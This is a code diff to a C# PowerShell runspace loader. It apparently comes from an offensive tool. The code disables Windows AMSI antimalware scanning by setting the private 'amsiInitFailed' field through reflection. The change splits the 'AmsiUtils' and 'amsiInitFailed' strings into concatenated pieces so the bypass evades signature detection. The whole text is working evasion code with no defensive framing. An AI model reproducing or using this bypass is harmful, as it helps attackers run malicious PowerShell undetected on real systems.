@@ -36,8 +36,8 @@ public class Program
             RunspaceInvoke scriptInvoker = new RunspaceInvoke(newrunspace);
             try
             {
-                var amsi = scriptInvoker.GetType().Assembly.GetType("System.Management.Automation.AmsiUtils");
-                var amsifield = amsi.GetField("amsiInitFailed", BindingFlags.NonPublic | BindingFlags.Static);
+                var amsi = scriptInvoker.GetType().Assembly.GetType("Syste" + "m.Management.Autom" + "ation.Ams" + "iUtils");
+                var amsifield = amsi.GetField("am" + "siIni" + "tFailed", BindingFlags.NonPublic | BindingFlags.Static);
                 amsifield.SetValue(null, true);
             } catch { }
             Pipeline pipeline = newrunspace.CreatePipeline();
